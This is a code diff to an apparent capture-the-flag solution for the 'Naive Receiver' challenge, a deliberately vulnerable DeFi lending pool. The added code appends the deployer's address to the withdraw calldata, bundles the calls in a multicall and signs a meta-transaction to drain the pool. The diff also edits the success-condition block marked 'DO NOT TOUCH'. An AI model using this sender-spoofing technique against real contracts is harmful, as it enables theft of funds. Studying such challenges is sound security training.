@@ -111,20 +111,31 @@ contract NaiveReceiverChallenge is Test {
         }
         // @audit drain the pool's contract
         callDatas[10] = abi.encodePacked(
-            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)))
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
+            bytes32(uint256(uint160(deployer))) //deployer
         );
-
+        // @audit multicall
         bytes memory callData = abi.encodeCall(pool.multicall, (callDatas));
-
+        // @audit request
         BasicForwarder.Request memory request = BasicForwarder.Request({
             from: player,
-            target: adddress(pool),
+            target: address(pool),
             value: 0,
-            gas: 100000,
+            gas: 10000000,
             nonce: 0,
             data: callData,
             deadline: block.timestamp
-        })
+        });
+        // @audit prepare signature
+        bytes32 requestHash = keccak256(abi.encodePacked(
+             "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+        ));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        require(forwarder.execute(request, signature));  
     }
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -137,7 +148,7 @@ contract NaiveReceiverChallenge is Test {
         assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL + WETH_IN_RECEIVER, "Unexpected balance in pool");
+        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");
 
         // All funds sent to recovery account
         // assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
